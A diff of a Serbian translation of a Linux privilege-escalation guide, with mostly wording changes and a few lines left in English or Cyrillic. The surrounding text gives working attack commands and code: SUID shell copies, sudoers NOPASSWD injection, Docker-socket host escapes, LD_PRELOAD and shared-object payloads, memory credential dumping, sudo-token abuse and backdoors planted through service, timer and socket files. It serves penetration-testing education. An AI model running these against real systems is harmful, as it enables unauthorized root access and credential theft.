@@ -27,7 +27,7 @@ cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
 ### Putanja
 
-Ako **imate dozvole za pisanje u bilo kojoj fascikli unutar `PATH`** promenljive, možda ćete moći da preuzmete neke biblioteke ili binarne datoteke:
+Ako **imate dozvole za pisanje u bilo kojem folderu unutar `PATH`** promenljive, možda ćete moći da preuzmete neke biblioteke ili binarne datoteke:
 ```bash
 echo $PATH
 ```
@@ -45,8 +45,8 @@ cat /proc/version
 uname -a
 searchsploit "Linux Kernel"
 ```
-Možete pronaći dobru listu ranjivih kernela i neke već **kompajlirane eksploite** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
-Ostale stranice gde možete pronaći neke **kompajlirane eksploite**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
+Možete pronaći dobru listu ranjivih kernela i neke već **kompilirane eksploite** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
+Ostale stranice gde možete pronaći neke **kompilirane eksploite**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
 Da biste izvukli sve ranjive verzije kernela sa te veb stranice, možete uraditi:
 ```bash
@@ -99,7 +99,7 @@ date 2>/dev/null #Date
 lscpu #CPU info
 lpstat -a 2>/dev/null #Printers info
 ```
-## Enumerate possible defenses
+## Nabrojati moguće odbrane
 
 ### AppArmor
 ```bash
@@ -161,7 +161,7 @@ Takođe, proverite da li je **bilo koji kompajler instaliran**. Ovo je korisno a
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
-### Vulnerable Software Installed
+### Instaliran ranjiv softver
 
 Proverite **verziju instaliranih paketa i usluga**. Možda postoji neka stara verzija Nagios-a (na primer) koja bi mogla biti iskorišćena za eskalaciju privilegija…\
 Preporučuje se da se ručno proveri verzija sumnjivijeg instaliranog softvera.
@@ -172,7 +172,7 @@ rpm -qa #Centos
 Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite zastarele i ranjive softvere instalirane unutar mašine.
 
 {% hint style="info" %}
-_Imajte na umu da će ovi komandi prikazati mnogo informacija koje će većinom biti beskorisne, stoga se preporučuju neke aplikacije poput OpenVAS-a ili sličnih koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate eksploite._
+_Napomena da će ovi komandi prikazati mnogo informacija koje će većinom biti beskorisne, stoga se preporučuju neke aplikacije poput OpenVAS-a ili sličnih koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate eksploite_
 {% endhint %}
 
 ## Procesi
@@ -184,7 +184,7 @@ ps -ef
 top -n 1
 ```
 Uvek proverite moguće [**electron/cef/chromium debuggere** koji rade, mogli biste to iskoristiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom `--inspect` parametra unutar komandne linije procesa.\
-Takođe **proverite svoje privilegije nad binarnim datotekama procesa**, možda možete prepisati nekoga.
+Takođe **proverite svoje privilegije nad binarnim datotekama procesa**, možda možete prepisati nečije.
 
 ### Praćenje procesa
 
@@ -199,12 +199,12 @@ Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa k
 {% hint style="warning" %}
 Imajte na umu da danas većina mašina **ne dozvoljava ptrace po defaultu**, što znači da ne možete dumpovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
 
-Datoteka _**/proc/sys/kernel/yama/ptrace\_scope**_ kontroliše pristupnost ptrace:
+Datoteka _**/proc/sys/kernel/yama/ptrace\_scope**_ kontroliše dostupnost ptrace:
 
 * **kernel.yama.ptrace\_scope = 0**: svi procesi mogu biti debagovani, sve dok imaju isti uid. Ovo je klasičan način na koji je ptracing radio.
 * **kernel.yama.ptrace\_scope = 1**: samo roditeljski proces može biti debagovan.
 * **kernel.yama.ptrace\_scope = 2**: samo admin može koristiti ptrace, jer zahteva CAP\_SYS\_PTRACE sposobnost.
-* **kernel.yama.ptrace\_scope = 3**: Niti jedan proces ne može biti praćen sa ptrace. Kada se postavi, potreban je restart da se ponovo omogući ptracing.
+* **kernel.yama.ptrace\_scope = 3**: Niti jedan proces ne može biti praćen sa ptrace. Kada se postavi, potrebno je ponovo pokrenuti da bi se omogućio ptracing.
 {% endhint %}
 
 #### GDB
@@ -235,7 +235,7 @@ done
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
-Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane oblasti**. **Mem** pseudo fajl **izlaže samu memoriju procesa**. Iz **maps** fajla znamo koje su **oblasti memorije čitljive** i njihovi ofseti. Ove informacije koristimo da **pretražimo mem fajl i dump-ujemo sve čitljive oblasti** u fajl.
+Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane oblasti**. **Mem** pseudo fajl **izlaže samu memoriju procesa**. Iz **maps** fajla znamo koje su **oblasti memorije čitljive** i njihovi ofseti. Koristimo ove informacije da **tražimo u mem fajlu i prebacimo sve čitljive oblasti** u fajl.
 ```bash
 procdump()
 (
@@ -251,7 +251,7 @@ rm $1*.bin
 #### /dev/mem
 
 `/dev/mem` omogućava pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti koristeći /dev/kmem.\
-Obično, `/dev/mem` je samo čitljiv od strane **root** i **kmem** grupe.
+Obično, `/dev/mem` je samo čitljiv za **root** i **kmem** grupu.
 ```
 strings /dev/mem -n10 | grep -i PASS
 ```
@@ -310,7 +310,7 @@ strings *.dump | grep -i password
 
 Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **poznatih fajlova**. Zahteva root privilegije da bi pravilno radio.
 
-| Funkcija                                          | Ime procesa          |
+| Karakteristika                                     | Ime procesa          |
 | ------------------------------------------------- | -------------------- |
 | GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
 | Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
@@ -345,7 +345,7 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 
 Na primer, unutar _/etc/crontab_ možete pronaći PUTANJU: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_
 
-(_Obratite pažnju na to da korisnik "user" ima privilegije pisanja nad /home/user_)
+(_Obratite pažnju na to kako korisnik "user" ima privilegije pisanja nad /home/user_)
 
 Ako unutar ovog crontaba korisnik root pokuša da izvrši neku komandu ili skriptu bez postavljanja putanje. Na primer: _\* \* \* \* root overwrite.sh_\
 Tada možete dobiti root shell koristeći:
@@ -376,7 +376,7 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-Ako skripta koju izvršava root koristi **direktorijum gde imate pun pristup**, možda bi bilo korisno da obrišete tu fasciklu i **napravite symlink fasciklu ka drugoj** koja služi skripti koju kontrolišete.
+Ako skripta koju izvršava root koristi **direktorijum gde imate pun pristup**, možda bi bilo korisno da obrišete tu fasciklu i **napravite simbolički link ka drugoj** koja služi skripti koju kontrolišete.
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
@@ -400,7 +400,7 @@ Moguće je kreirati cronjob **stavljanjem povratka u red nakon komentara** (bez 
 
 ### Writable _.service_ datoteke
 
-Proverite da li možete da pišete u bilo koju `.service` datoteku, ako možete, **možete je izmeniti** tako da **izvršava** vašu **backdoor kada** se usluga **pokrene**, **ponovo pokrene** ili **zaustavi** (možda ćete morati da sačekate da se mašina ponovo pokrene).\
+Proverite da li možete da pišete u bilo koju `.service` datoteku, ako možete, **možete je modifikovati** tako da **izvršava** vašu **backdoor kada** se usluga **pokrene**, **ponovo pokrene** ili **zaustavi** (možda ćete morati da sačekate da se mašina ponovo pokrene).\
 Na primer, kreirajte svoju backdoor unutar .service datoteke sa **`ExecStart=/tmp/script.sh`**
 
 ### Writable servisne binarne datoteke
@@ -419,13 +419,13 @@ ExecStart=faraday-server
 ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
 ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
 ```
-Zatim, kreirajte **izvršni** fajl sa **istim imenom kao relativna putanja binarnog fajla** unutar systemd PATH foldera u koji možete pisati, i kada se od servisa zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaša **zadnja vrata će biti izvršena** (korisnici bez privilegija obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete koristiti `sudo -l`).
+Zatim, kreirajte **izvršni** fajl sa **istim imenom kao relativna putanja binarnog fajla** unutar systemd PATH foldera u koji možete pisati, i kada se od servisa zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaša **backdoor će biti izvršena** (korisnici bez privilegija obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete koristiti `sudo -l`).
 
 **Saznajte više o servisima sa `man systemd.service`.**
 
 ## **Tajmeri**
 
-**Tajmeri** su systemd jedinice čija imena se završavaju sa `**.timer**` koje kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za događaje kalendarskog vremena i monotonskog vremena i mogu se izvršavati asinhrono.
+**Tajmeri** su systemd jedinice čija imena se završavaju sa `**.timer**` koje kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za događaje kalendarskog vremena i monotonskog vremena i mogu se izvršavati asinkrono.
 
 Možete nabrojati sve tajmere sa:
 ```bash
@@ -439,7 +439,7 @@ Unit=backdoor.service
 ```
 U dokumentaciji možete pročitati šta je jedinica:
 
-> Jedinica koja se aktivira kada ovaj tajmer istekne. Argument je naziv jedinice, čija sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano se postavlja na servis koji ima isto ime kao jedinica tajmera, osim sufiksa. (Pogledajte iznad.) Preporučuje se da naziv jedinice koja se aktivira i naziv jedinice tajmera budu identični, osim sufiksa.
+> Jedinica koja se aktivira kada ovaj tajmer istekne. Argument je naziv jedinice, čija sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano se postavlja na servis koji ima isto ime kao jedinica tajmera, osim sufiksa. (Vidi iznad.) Preporučuje se da naziv jedinice koja se aktivira i naziv jedinice tajmera budu identični, osim sufiksa.
 
 Dakle, da biste zloupotrebili ovu dozvolu, trebali biste:
 
@@ -455,36 +455,36 @@ Da biste omogućili tajmer, potrebne su vam root privilegije i da izvršite:
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
-Napomena da je **tajmer** **aktiviran** kreiranjem symlink-a na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
 
 ## Sockets
 
-Unix domena soketa (UDS) omogućava **komunikaciju procesa** na istim ili različitim mašinama unutar klijent-server modela. Koriste standardne Unix deskriptore za međumašinsku komunikaciju i postavljaju se putem `.socket` datoteka.
+Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istim ili različitim mašinama unutar klijent-server modela. Koriste standardne Unix deskriptore za međusobnu komunikaciju i postavljaju se putem `.socket` datoteka.
 
-Soketi se mogu konfigurisati koristeći `.socket` datoteke.
+Sockets can be configured using `.socket` files.
 
-**Saznajte više o soketima sa `man systemd.socket`.** Unutar ove datoteke može se konfigurisati nekoliko interesantnih parametara:
+**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:
 
-* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije su različite, ali se koristi sažetak da **naznači gde će slušati** soket (putanja AF_UNIX soket datoteke, IPv4/6 i/ili broj porta za slušanje, itd.)
-* `Accept`: Prihvaća boolean argument. Ako je **true**, **instanca servisa se pokreće za svaku dolaznu konekciju** i samo se soket konekcije prosleđuje. Ako je **false**, svi slušajući soketi se **prosleđuju pokrenutoj servisnoj jedinici**, i samo jedna servisna jedinica se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sokete i FIFOs gde jedna servisna jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi, preporučuje se pisanje novih demona samo na način koji je pogodan za `Accept=no`.
-* `ExecStartPre`, `ExecStartPost`: Prihvaća jedan ili više komandnih redova, koji se **izvršavaju pre** ili **posle** kreiranja i vezivanja slušajućih **soketa**/FIFOs, redom. Prvi token komandnog reda mora biti apsolutna datoteka, a zatim slede argumenti za proces.
-* `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja slušajućih **soketa**/FIFOs, redom.
-* `Service`: Specifikuje naziv **servisne** jedinice **koju treba aktivirati** na **dolaznom saobraćaju**. Ova postavka je dozvoljena samo za sokete sa Accept=no. Podrazumevano je na servis koji nosi isto ime kao soket (sa zamenjenim sufiksom). U većini slučajeva, ne bi trebalo da bude potrebno koristiti ovu opciju.
+* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije su različite, ali se koristi sažetak da **naznači gde će slušati** socket (putanja AF\_UNIX socket datoteke, IPv4/6 i/ili broj porta za slušanje, itd.)
+* `Accept`: Prihvaća boolean argument. Ako je **true**, **instanca servisa se pokreće za svaku dolaznu konekciju** i samo se socket konekcije prosleđuje. Ako je **false**, svi slušajući socketi se **prosleđuju pokrenutoj servisnoj jedinici**, i samo jedna servisna jedinica se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram socket-e i FIFO-e gde jedna servisna jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Zbog razloga performansi, preporučuje se pisanje novih demona samo na način koji je pogodan za `Accept=no`.
+* `ExecStartPre`, `ExecStartPost`: Prihvaća jedan ili više komandnih redova, koji se **izvršavaju pre** ili **posle** kreiranja i vezivanja slušajućih **socket-a**/FIFO-a, redom. Prvi token komandnog reda mora biti apsolutna putanja do datoteke, a zatim slede argumenti za proces.
+* `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja slušajućih **socket-a**/FIFO-a, redom.
+* `Service`: Određuje naziv **servisne** jedinice **koju treba aktivirati** na **dolaznom saobraćaju**. Ova postavka je dozvoljena samo za socket-e sa Accept=no. Podrazumevano se koristi servis koji nosi isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva, ne bi trebalo da bude potrebno koristiti ovu opciju.
 
 ### Writable .socket files
 
-Ako pronađete **writable** `.socket` datoteku, možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što soket bude kreiran. Stoga, **verovatno ćete morati da sačekate da se mašina ponovo pokrene.**\
-&#xNAN;_&#x4E;ote da sistem mora koristiti tu konfiguraciju soket datoteke ili backdoor neće biti izvršen_
+If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
+&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_
 
 ### Writable sockets
 
-Ako **identifikujete bilo koji writable soket** (_sada govorimo o Unix soketima, a ne o konfiguracionim `.socket` datotekama_), tada **možete komunicirati** sa tim soketom i možda iskoristiti ranjivost.
+If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.
 
 ### Enumerate Unix Sockets
 ```bash
 netstat -a -p --unix
 ```
-### Sirova veza
+### Raw veza
 ```bash
 #apt-get install netcat-openbsd
 nc -U /tmp/socket  #Connect to UNIX-domain stream socket
@@ -501,7 +501,7 @@ socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of 
 
 ### HTTP soketi
 
-Imajte na umu da može postojati nekoliko **soketa koji slušaju HTTP** zahteve (_ne govorim o .socket datotekama već o datotekama koje deluju kao unix soketi_). Ovo možete proveriti sa:
+Napomena da može postojati nekoliko **soketa koji slušaju HTTP** zahteve (_ne govorim o .socket datotekama već o datotekama koje deluju kao unix soketi_). Ovo možete proveriti sa:
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
@@ -518,7 +518,7 @@ Ako imate pristup za pisanje na Docker soket, možete eskalirati privilegije kor
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
-Ove komande vam omogućavaju da pokrenete kontejner sa pristupom na nivou root-a do datotečnog sistema hosta.
+Ove komande vam omogućavaju da pokrenete kontejner sa pristupom na nivou root-a do datotečnog sistema host-a.
 
 #### **Korišćenje Docker API direktno**
 
@@ -540,7 +540,7 @@ Pokrenite novokreirani kontejner:
 ```bash
 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
 ```
-3.  **Priključite se kontejneru:** Koristite `socat` da uspostavite vezu sa kontejnerom, omogućavajući izvršavanje komandi unutar njega.
+3.  **Priključite se kontejneru:** Koristite `socat` za uspostavljanje veze sa kontejnerom, omogućavajući izvršavanje komandi unutar njega.
 
 ```bash
 socat - UNIX-CONNECT:/var/run/docker.sock
@@ -550,7 +550,7 @@ Connection: Upgrade
 Upgrade: tcp
 ```
 
-Nakon postavljanja `socat` veze, možete direktno izvršavati komande u kontejneru sa pristupom na nivou root-a do datotečnog sistema hosta.
+Nakon postavljanja `socat` veze, možete izvršavati komande direktno u kontejneru sa pristupom na nivou root-a do datotečnog sistema host-a.
 
 ### Ostalo
 
@@ -588,7 +588,7 @@ D-Bus funkcioniše na **modelu dozvola/odbijanja**, upravljajući dozvolama za p
 
 Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, detaljno opisujući dozvole za root korisnika da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.
 
-Politike bez specificiranog korisnika ili grupe primenjuju se univerzalno, dok "podrazumevane" politike konteksta važe za sve što nije pokriveno drugim specifičnim politikama.
+Politike bez specificiranog korisnika ili grupe primenjuju se univerzalno, dok "podrazumevane" kontekst politike važe za sve što nije pokriveno drugim specifičnim politikama.
 ```xml
 <policy user="root">
 <allow own="fi.w1.wpa_supplicant1"/>
@@ -705,10 +705,10 @@ Ako **znate neku lozinku** okruženja **pokušajte da se prijavite kao svaki kor
 
 ### Su Brute
 
-Ako vam nije stalo do pravljenja puno buke i `su` i `timeout` binarni fajlovi su prisutni na računaru, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
-[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava da brute-force-uje korisnike.
+Ako vam nije stalo do pravljenja puno buke i `su` i `timeout` binarni fajlovi su prisutni na računaru, možete pokušati da brute-force korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava da brute-force korisnike.
 
-## Zloupotrebe zapisivih PATH-ova
+## Zloupotreba zapisivih PATH-ova
 
 ### $PATH
 
@@ -756,7 +756,7 @@ sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
 ### Sudo izvršavanje zaobilaženje putanja
 
-**Preskočite** da pročitate druge datoteke ili koristite **simboličke linkove**. Na primer, u sudoers datoteci: _hacker10 ALL= (root) /bin/less /var/log/\*_
+**Skočite** da pročitate druge datoteke ili koristite **simboličke linkove**. Na primer, u sudoers datoteci: _hacker10 ALL= (root) /bin/less /var/log/\*_
 ```bash
 sudo less /var/logs/anything
 less>:e /etc/shadow #Jump to read other files using privileged less
@@ -794,18 +794,18 @@ Na primer, ako suid binarni poziva _**/usr/sbin/service apache2 start**_ morate 
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
-Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena
+Then, when you call the suid binary, this function will be executed
 
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
-**LD\_PRELOAD** promenljiva okruženja se koristi za specificiranje jedne ili više deljenih biblioteka (.so fajlova) koje će loader učitati pre svih drugih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao preloading biblioteke.
+The **LD\_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
 
-Međutim, da bi se održala sigurnost sistema i sprečilo korišćenje ove funkcije, posebno sa **suid/sgid** izvršnim fajlovima, sistem nameće određene uslove:
+Međutim, da bi se održala sigurnost sistema i sprečilo da se ova funkcija zloupotrebi, posebno sa **suid/sgid** izvršnim datotekama, sistem nameće određene uslove:
 
-* Loader zanemaruje **LD\_PRELOAD** za izvršne fajlove gde se stvarni korisnički ID (_ruid_) ne poklapa sa efektivnim korisničkim ID (_euid_).
-* Za izvršne fajlove sa suid/sgid, samo biblioteke u standardnim putanjama koje su takođe suid/sgid se pre-loaduju.
+* Loader zanemaruje **LD\_PRELOAD** za izvršne datoteke gde se stvarni korisnički ID (_ruid_) ne poklapa sa efektivnim korisničkim ID (_euid_).
+* Za izvršne datoteke sa suid/sgid, samo biblioteke u standardnim putanjama koje su takođe suid/sgid se prelažu.
 
-Povećanje privilegija može se dogoditi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` uključuje izjavu **env\_keep+=LD\_PRELOAD**. Ova konfiguracija omogućava da **LD\_PRELOAD** promenljiva okruženja opstane i bude prepoznata čak i kada se komande izvršavaju sa `sudo`, potencijalno dovodeći do izvršavanja proizvoljnog koda sa povišenim privilegijama.
+Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env\_keep+=LD\_PRELOAD**. This configuration allows the **LD\_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
 ```
 Defaults        env_keep += LD_PRELOAD
 ```
@@ -827,7 +827,7 @@ Zatim **kompajlirajte to** koristeći:
 cd /tmp
 gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-Na kraju, **povećajte privilegije** pokretanjem
+Konačno, **povećajte privilegije** pokretanjem
 ```bash
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
@@ -861,7 +861,7 @@ strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
 Na primer, susret sa greškom poput _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Nema takve datoteke ili direktorijuma)"_ sugeriše potencijal za eksploataciju.
 
-Da bi se to iskoristilo, trebalo bi da se napravi C datoteka, recimo _"/path/to/.config/libcalc.c"_, koja sadrži sledeći kod:
+Da bi se to iskoristilo, nastavilo bi se kreiranjem C datoteke, recimo _"/path/to/.config/libcalc.c"_, koja sadrži sledeći kod:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -874,11 +874,11 @@ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 ```
 Ovaj kod, kada se kompajlira i izvrši, ima za cilj da poveća privilegije manipulisanjem dozvolama datoteka i izvršavanjem shel-a sa povišenim privilegijama.
 
-Kompajlirajte gornju C datoteku u deljeni objekat (.so) datoteku sa:
+Kompajlirajte gornji C fajl u deljeni objekat (.so) fajl sa:
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-Na kraju, pokretanje pogođenog SUID binarnog fajla trebalo bi da aktivira eksploataciju, omogućavajući potencijalni kompromis sistema.
+Konačno, pokretanje pogođenog SUID binarnog fajla trebalo bi da aktivira eksploataciju, omogućavajući potencijalni kompromis sistema.
 
 ## Hijacking deljenih objekata
 ```bash
@@ -935,7 +935,7 @@ U slučajevima kada imate **sudo pristup** ali ne i lozinku, možete eskalirati 
 Zahtevi za eskalaciju privilegija:
 
 * Već imate ljusku kao korisnik "_sampleuser_"
-* "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu, to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
+* "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu, to je trajanje sudo tokena koji nam omogućava da koristimo `sudo` bez unošenja lozinke)
 * `cat /proc/sys/kernel/yama/ptrace_scope` je 0
 * `gdb` je dostupan (možete ga učitati)
 
@@ -961,8 +961,8 @@ sudo su
 ```
 ### /var/run/sudo/ts/\<Username>
 
-Ako imate **dozvole za pisanje** u folderu ili na bilo kojoj od kreiranih datoteka unutar foldera, možete koristiti binarni [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
-Na primer, ako možete da prepišete datoteku _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku tako što ćete:
+Ako imate **dozvole za pisanje** u folderu ili na bilo kojem od kreiranih fajlova unutar foldera, možete koristiti binarni [**write\_sudo\_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\
+Na primer, ako možete da prepišete fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku tako što ćete:
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
@@ -974,7 +974,7 @@ Datoteka `/etc/sudoers` i datoteke unutar `/etc/sudoers.d` konfigurišu ko može
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
-Ako možete da pišete, možete zloupotrebiti ovu dozvolu.
+Ако можете да пишете, можете злоупотребити ову дозволу.
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
@@ -994,9 +994,9 @@ permit nopass demo as root cmd vim
 ```
 ### Sudo Hijacking
 
-Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija i dobili ste shell unutar tog korisničkog konteksta, možete **napraviti novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **modifikujte $PATH** korisničkog konteksta (na primer, dodajući novi put u .bash\_profile) tako da kada korisnik izvrši sudo, vaš sudo izvršni fajl bude izvršen.
+Ako znate da **korisnik obično pristupa mašini i koristi `sudo`** za eskalaciju privilegija i dobili ste shell unutar tog korisničkog konteksta, možete **napraviti novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **modifikujte $PATH** korisničkog konteksta (na primer, dodajući novi put u .bash\_profile) tako da kada korisnik izvrši sudo, vaš sudo izvršni fajl bude izvršen.
 
-Imajte na umu da ako korisnik koristi drugačiji shell (ne bash) biće potrebno da modifikujete druge fajlove da dodate novi put. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete pronaći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
+Imajte na umu da ako korisnik koristi drugačiji shell (ne bash) bićete u obavezi da modifikujete druge fajlove kako biste dodali novi put. Na primer, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Možete pronaći još jedan primer u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
 
 Ili pokretanjem nečega poput:
 ```bash
@@ -1039,7 +1039,7 @@ linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
 ```
-Kopiranjem lib u `/var/tmp/flag15/` biće korišćen od strane programa na ovom mestu kao što je navedeno u `RPATH` varijabli.
